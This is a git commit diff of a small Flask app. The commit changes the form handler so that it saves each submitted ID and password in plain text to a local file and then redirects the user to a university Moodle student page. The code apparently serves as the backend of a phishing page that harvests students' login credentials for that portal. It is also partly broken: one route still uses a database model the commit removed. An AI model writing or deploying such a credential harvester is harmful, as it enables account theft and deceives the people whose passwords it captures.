097442472c59b39e7412b94f04ec542dc27fcc3f
S-H-E1 <111588540+S-H-E1@users.noreply.github.com>
2022-08-21 13:10:49 +0300

    update

--- app.py
+++ app.py
@@ -1,38 +1,26 @@
-from flask import Flask, render_template, request
-from flask_sqlalchemy import SQLAlchemy
+from flask import Flask, redirect, render_template, request
+
 
 app = Flask(__name__)
-
-app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
-app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///data.db'
-db = SQLAlchemy(app)
-
-
-
-class User(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    username = db.Column(db.String(100), nullable=False)
-    password = db.Column(db.String(100), nullable=False)
-    def __repr__(self):
-        return self.username
-
 
 @app.route("/", methods= ["POST"] )
 def main():
     if request.method == "POST":
         id = request.form.get('id')
         password = request.form.get("password")
-        user = User(username=id, password=password)
-        db.session.add(user)
-        db.session.commit()
-        data = User.query.all()
-        print(data)
-        return "<p> this is awsome</p>"
+        
+        with open('data.txt', "w")as data:
+            data.write(id)
+            data.write('\n')
+            data.write(password)
+            data.write('\n')
+        
+        return redirect('moodle.smuc.edu.et/students/')
 
 @app.route("/random")
 def random():
     users = User.query.all()
     return render_template('users.html', users=users)
-if '__name__' == '__main__':
-    db.create_all()
+if __name__ == '__main__':
+
     app.run()
